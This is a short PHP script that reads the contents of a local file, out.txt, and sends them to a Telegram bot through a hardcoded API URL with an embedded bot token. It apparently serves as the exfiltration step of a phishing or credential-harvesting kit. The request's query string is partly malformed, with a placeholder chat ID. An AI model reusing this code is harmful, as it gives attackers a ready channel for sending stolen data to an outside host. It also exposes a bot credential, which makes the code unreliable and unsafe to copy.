<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1944714994:AAHdJBpCZWF2WHYWUurlrCuow3hQkgzVW0g/sendMessage?1335485080=CHATID&text=$msg");
?>
